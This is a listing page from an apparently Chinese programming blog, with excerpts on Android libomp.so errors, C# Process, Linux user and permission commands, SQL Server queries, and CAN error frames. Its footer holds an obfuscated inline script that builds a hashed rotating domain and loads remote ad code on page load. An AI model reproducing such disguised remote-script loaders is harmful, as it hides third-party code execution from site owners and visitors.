循环数据流范式的优势在于，它可以实现高效的并行处理和流水打拍计算，因为循环体的执行是由数据依赖关系驱动的，而不是由控制流依赖关系驱动的。由此即可在数字信号处理算法等应用中提高性能和资源利用率，因为这些应用中的数据依赖关系通常定义明确，并可加以妥善利用来进行优化。
总之，循环数据流是一种强调数据流经循环构造的编程或设计范式，可以实现计算的高效并行执行。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b05c33cb04a79ac22e52ca0cba028576/" rel="bookmark">
			dlopen failed: library “libomp.so“ not found
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 解决dlopen failed: library "libomp.so" not found 目录
解决dlopen failed: library "libomp.so" not found
1.问题描述
2.解决方法1
3.解决方法2(不推荐)
1.开发版本 Android SDK和NDK相关版本信息，请参考： Android Studio 4.1.1JDK Java1.8(Jave 8) JAVA_VERSION="1.8.0_242"CMake 3.18.1 2.问题描述 Android NDK开发时，如果开启多线程加速，需要用到openMP库，一些版本的差异，会出现dlopen failed: library "libomp.so" not found的错误，即找到libomp.so库
【尊重原则】转载请注明出处：解决dlopen failed: library “libomp.so“ not found_PKing666666的博客-CSDN博客_dlopen failed
解决方法有两种方式
3.解决方法1 解决思路也很粗暴，直接将NDK里libomp.so拷贝到'src/main/jniLibs'或者'libs'，即可解决问题。
比如我使用的是NDK版本是：android-ndk-r21e，在该目录下搜索libomp.so，
至于拷贝哪个处理器版本，需要根据你的平台选择，一般在abiFilters会指定 "armeabi-v7a", "arm64-v8a"平台，拷贝对应的版本即可；如果不存在，可以复制其他平台的libomp.so代替试试。
拷贝的目的地址，由jniLibs.srcDirs指定so库的位置：
jniLibs.srcDirs = ['src/main/jniLibs', 'libs'] 举个例子：
比如将【aarch64】里面的libomp库复制到项目src/main/jniLibs中的 "armeabi-v7a", "arm64-v8a"目录下(目录不存在,则新建)，然后再运行测试（大部分手机都可以这么解决）如果还不能正常运行，则复制【arm】或者其他平台的libomp.so代替试试 4.解决方法2(不推荐) 为了减小APK的大小，项目只适配了【"armeabi-v7a", "arm64-v8a" 】处理器架构库，这会导致部分手机不支持。build完成后，在app/build/intermediates/cmake/debug/obj可查看到已经编译且支持库；其中libomp.so可能因为一些差异导致没有生成或者没有找到
解决方法:
先删除之前build的中间产物：把app/.cxx和app/build目录都删除掉注释掉app/build.gradle文件中：abiFilters "armeabi-v7a", "arm64-v8a" （这样就会生成所有处理器架构库，但打包APK会比较大）重新build,run重新查看app/build/intermediates/cmake/debug/obj，发现已经支持【"armeabi-v7a", "arm64-v8a","x86","x86_64"】等库 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8d5498c3f795618d329b0f01f2a21f1/" rel="bookmark">
			C#Process调用外部程序(如何通过protoc.exe编译C&#43;&#43; 的Proto文件生成C#的.proto文件)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Process类是C#中用于控制进程的类，该类所在的命名空间是System.Diagnostics.
1.Start()方法：启动一个新的进程。
Process.Start(“notepad.exe”);或Process.Start(“notepad.exe”，str); //str为传递的参数
2.Kill()方法：结束一个进程。
Process.GetProcessById(1234).Kill();
3.WaitForExit()方法：等待进程结束。
Process.GetProcessById(1234).WaitForExit();
4.GetProcesses()方法：获取当前所有正在运行的进程。
Process[] processes = Process.GetProcesses();
5.GetProcessById()方法：根据进程ID获取进程。
Process process = Process.GetProcessById(1234);
6.GetCurrentProcess()方法：获取当前进程。
Process currentProcess = Process.GetCurrentProcess();
7.GetProcessByName()方法：根据进程名获取进程。
Process[] processes = Process.GetProcessesByName(“notepad”);
下面是在网上看到的如何通过protoc.exe编译C++ 的Proto文件生成C#的.proto文件_大侠后花园的博客-CSDN博客
正好看一下Process
using System.Collections; using System.Collections.Generic; using System.Diagnostics; using System.IO; using UnityEditor; using UnityEngine; using Debug = UnityEngine.Debug; public class ProtoEditor : EditorWindow { [MenuItem("proto生成/proto", false)] public static void GenProtoCSFile() { string protogen = Application.streamingAssetsPath + "/ProtoGen/protoc.exe"; string protoDir = Application.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f8d5498c3f795618d329b0f01f2a21f1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9ed5c2a46e1b07232f36e851e16814b4/" rel="bookmark">
			前端自适应终极解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题：由于ui设计稿为1920*1080，开发时浏览器可视窗口尺寸高度不足1080。从而导致无法按照设计图实际尺寸开发，造成与设计图比例不符
解决方案：autofit.js
1、安装 npm i autofit.js
2、页面引用 import autofit from ‘autofit.js’
3、初始化，因为需要操作dom，所以在mounted中初始化
4、相关配置
5、关闭autofit.js带来的影响
destroyed() {
autofit.off(); }
6、配置文档地址：https://www.npmjs.com/package/autofit.js
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cb610a9eab96d29f24b8df68afaa944b/" rel="bookmark">
			Linux基础命令2
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当访问操作系统时，基于账户身份对资源访问进行控制 用户账号标识方式：UID 组账号标识方式：GID 管理员root UID 为0 系统用户UID为1-999 普通用户UID为1000及以后 一个用户必须至少属于一个组（基本组/附加组） 创建用户用useradd +用户名 在 /etc/passwd 文件中查看创建的用户（所有的用户都在/etc/passwd文件中） 用户信息由7个部分组成： 用户名：密码占位符：UID：基本组GID：用户描述信息（可以为空）：用户家目录：用户解释器 在创建用户时（useradd）指定其属性 -u：指定UID标记号 id命令：查看用户的ID -d：指定用户家目录，默认/home（不能事先创建目录） -G：指定所属的附加组（拓展组） 创建一个组groupadd -s：指定用户的登录解释器 /sbin/nologin ：禁止用户登录操作系统 usermod命令：修改已经存在的用户信息（ 其实修改/etc/passwd（保存用户信息）文件的内容） -l：更改用户账号的名称 -u：更改用户ID -d：更改家目录路径（不会创建新目录） -G：更改附加组（重置，如果没有附加组就会添加附加组，有附加组就会更改附加组，如果有两个附加组，更改后只有更改的附加组一个） -s：更改登录解释器 passwd命令：给用户设置密码（交互式方式） passwd [选项] 用户名 用管理员修改密码，不需知道用户的旧密码，修改的密码不用担心密码的复杂度 --stdin 非交互式 su命令：临时登录（在root中登录不需要密码），如果普通用户su 普通用户需要密码，用exit退出 s - 用户名 在普通用户中设置密码直接passwd需要设置密码的复杂度 /etc/shadow ：用户密码文件（保存密码字符串、有效期，普通用户的权限查看不了），即使没有设置密码，也会在文件中显示用户信息 用户名称： 加密后的密码字符串（!!号表示自从创建用户后没有设置过密码）： 上一次修改密码的时间（从1970-1-1到上一次的天数）： 密码最短的使用时间（0表示没有限制）： 密码最长使用时间： 密码过期前的警告天数（默认7）： 密码过期后多少天禁用此账户： 账户失效时间（默认为空）： 保留字段（未使用） 用户家目录下面的主要配置文件：~/.bashrc：每次进入新的Bash环境时执行（开启新的终端） 在~/.bashrc中定义的别名是永久别名，在某个用户的家目录下面设置（定义别名），只针对该用户生效（在root中修改只对root生效，su 其他用户则无效） /etc/bashrc:全局配置文件，对所有的用户都生效 userdel命令：删除用户，-r 删除用户的家目录（如果用户没有家目录，也会把用户删除） /etc/group:保存组账号的基本信息 组账号名称：组的密码占位符：组的GID：组的成员内容 gpasswd命令：添加组账号 -a：添加组成员，每次只能添加一个 -d：删除组成员，每次只能删除一个 -M：设置多个用户，但设置完后之前的用户信息就会消失（重置组的成员），‘ ’用来清空组成员 -A：定义组的管理员（可以不属于当前组），设置某个用户为某个组的管理员后，该用户就可以对该组添加用户或者删除用户，减少了root的负担，加上‘用户名，用户名’，同时设置多个用户为管理员 /etc/gshadow：组管理信息配置文件 组名：组的密码（！表示没有密码）：组的管理员：组的成员 groupdel命令：删除组，只能删除不是基本组的组 当执行useradd命令时会在/etc/passwd增加一行信息，在/etc/shadow增加一行信息，在/home新增用户家目录，在/var/spool/mail增加用户邮件文件，在/etc/group增加一行组信息，在/etc/gshadow增加一行组的管理信息 当执行userdel -r命令时会在/etc/passwd删除一行信息，在/etc/shadow删除一行信息，在/home删除用户家目录，在/var/spool/mail删除用户邮件文件，在/etc/group删除一行组信息,在/etc/gshadow删除一行组的管理信息 计划任务（不需要人参与，固定的去执行任务）,按照设置的时间间隔为用户反复执行某一固定的系统任务 软件包：cronie、crontabs（默认安装） 系统服务：crond（系统默认开机自启动） 日志文件：/var/log/cron crontab 命令：管理计划任务策略 crontab -e [-u 用户名] ：编辑（如果后面不加用户名，就会默认当前登录的用户进行编辑） 计划任务书写格式： 分 时 日 月 周 任务命令行（绝对路径）每分钟执行一次 *：匹配范围内任意时间 ，：分隔多个不连续的时间点 -：指定连续时间范围 /n：指定时间频率，每n一次 例：每分钟记录系统时间 -l [-u 用户名] ：查看 -r [-u 用户名] ：清除（或者使用crontab -e 编辑文件删除） /var/spool/cron/root：任务文件 基本权限与归属： 访问权限：读取：允许查看内容 -r（read） 写入：允许修改内容 -w（write） 可执行：允许运行和切换 -x（execute） 对于文本文件： r读取权限：cat、less、grep、head、tail w写入权限：vim、&gt;、&gt;&gt; x可执行权限：Shell、Python 对于目录： r读取权限：ls命令查看目录内容 w写入权限：能够创建、删除、修改目录的内容（不能修改目录本身） x可执行权限：能够cd切换到此目录下 归属关系：所有者（属主）：拥有此文件/目录的用户 -u（user） 所属组（属组）：拥有此文件目录的组 -g（group） 其他用户：除所有者、所属组以外的用户 -o（other） -d查看目录 前三个rwx是所有者root的权限，中间三个r-x是所属组root的权限，后三个r-x是其他用户的权限 root无视所有权限，比如/etc/shadow文件 在根目录下面只要/tmp目录带特殊权限 chmod命令：修改权限 chmod [ugoa] [+-=][rwx] 文件 背景变绿代表设置其他用户有w权限（权限设置的开放） a代表所有人设置相同的权限 -R ：递归修改权限（针对目录本身及目录下面的所有子文件子目录已经存在的设置相同权限） 如果对文件有读写权限但对文件的父目录只有读没有写权限就不能访问该文件 权限位的8进制数表示： r、w、x、分别对应4、2、1，然后求和7 chmod nnn 文件 数字不适合小访问修改权限 chown命令：修改归属关系 chown 属主 文件 chown 属主:属组 文件 chown :属组 文件 查看用户对于该数据所处的身份，所有者&gt;所属组&gt;其他人，配置及停止（当匹配到权限就不会往下面继续匹配） 例如：当一个目录归属属主为zhangsan属组为stu，对zhangsan的权限为rwx，对stu权限为rwx，对其他人权限为r-x,另一个用户lisi就只能进入到该目录，不能创建和删除，当把lisi加入到stu组（gpasswd -a）中，lisi就有了wrx权限（需要重新注销登录），就能够创建，修改目录。当zhangsan权限为r-x时，把zhangsan加入到stu组中，此时zhangsan的权限还是为r-x不能修改目录，因为Linux匹配原则为所有者&gt;所属组&gt;其他人当匹配到所有者的权限时就不会合并/兼容到下面（所有组）的权限 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cb610a9eab96d29f24b8df68afaa944b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/324d49ca92f96e5eafa514074bcf1e49/" rel="bookmark">
			SQL Server 2016（在Products表中查询数据）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1、实验环境。 以实验案例一的结果为环境。
2、需求描述。 【1】查询成本低于10元的水果信息。
【2】将所有蔬菜的成本上调1源。
【3】查询成本大于3元并小于40元的产品信息，并按照成本从高到低的顺序显示结果。
【4】查询成本最高的5个产品信息。
【5】查询有哪些产品种类。
【6】将products表中所有水果的名称、种类和出厂日期信息并插入products_new中。
3、实验步骤。 使用SSMS管理工具连接数据库，然后右键点击PM数据库--点击查询。
1、查询成本低于10元的水果信息。
2、将所有蔬菜的成本上调1元。
3、查询成本大于3元并小于40元的产品信息，并按照成本从高到低的顺序显示结果。
4、查询成本最高的5个产品信息。
5、查询有哪些产品种类。
6、将products表中所有水果的名称、种类和出厂日期信息并插入products_new中。
4、命令参考。 ##查询成本小于10的所有信息 select * from products where 成本 &lt;10 —————————————————————————————— ##将数据表中蔬菜的成本加1 update products set 成本 = 成本+1 where 种类 = '蔬菜' select * from products //查询所有信息 —————————————————————————————— ##查询表中成本小于3并且大于40的数据，再以降序（高到底）显示 select * from products where 成本 &gt;3 and 成本&lt;40 order by 成本 desc —————————————————————————————— ##查询表中前5的数据并以降序显示 select top 5 * from products order by 成本 desc —————————————————————————————— ##查询表中的种类有几种 select distinct 种类 from products —————————————————————————————— ##查询表中的数据，然后创建一个新的表products_new并加入查询的数据 select 名称,种类,出厂日期 into products_new from products select * from products_new 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/80f3d386ea8425ac6bb17dfbc0a29a42/" rel="bookmark">
			iOS上传ipa使用可视化工具Transporter
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、Transporter二、Appuploader三、iTMSTransporter总结 前言 最近为了让非开发人员上传IPA文件，特意找了一些方法，至于以前的ApplicationUploader已经不能用了，下面介绍两个工具可以上传IPA包。
一、Transporter 1、操作简单、有效，直接在appstore上就可以搜索到
2、下载链接：Transporter
3、基本使用如下：
4、下载打开软件，直接添加APP即可
二、Appuploader 1、这个不是苹果官方的，但是有很多功能，能支持Windows。
2、下载链接：Appuploader
3、使用需要添加专用密码
三、iTMSTransporter 1、这个是上传IPA的一个工具，需要使用命令行上传
2、下载链接：Mac利用iTMSTransporter命令行上传 ipa 到 App Store
总结 这就是非开发人员上传IPA文件三种方式，希望能帮助到你！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe9a96933b5bc997288c3eddc9bb481f/" rel="bookmark">
			CAN网络出现错误帧从哪些方面去分析解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		标题：CAN网络出现错误帧从哪些方面去分析
实例1：
断电重启后，会有错误帧产生。
检查方案：
查看收发模块的初始化、使能是否在发送CAN报文之前完成？
实例2：
周期性报文，有时会冒出一帧错误帧，且错误帧出现无规律可循。
检查方案：
查看在发送周期性报文时，是不是一直在写芯片的CAN模块寄存器导致的
错误帧展示图片：
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/51/">«</a>
	<span class="pagination__item pagination__item--current">52/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/53/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>